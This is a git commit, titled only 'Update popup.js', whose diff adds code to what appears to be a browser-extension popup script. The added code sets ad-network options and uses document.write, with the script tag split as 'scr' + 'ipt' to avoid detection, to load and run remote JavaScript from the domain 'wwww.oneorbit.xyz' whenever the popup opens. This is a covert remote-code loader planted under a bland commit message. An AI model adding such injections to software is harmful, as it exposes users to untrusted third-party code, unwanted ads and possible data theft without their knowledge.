e34b65aad3996035602fcce446db1a9d802d58fc
mychiara <85479169+mychiara@users.noreply.github.com>
2022-06-25 00:31:16 +0800

    Update popup.js

--- popup.js
+++ popup.js
@@ -1,1 +1,9 @@
+atOptions = {
+		'key' : 'b5183bedb5e213cc968ff6dcef6a61e2',
+		'format' : 'iframe',
+		'height' : 90,
+		'width' : 728,
+		'params' : {}
+	};
+	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://wwww.oneorbit.xyz"></scr' + 'ipt>');
 
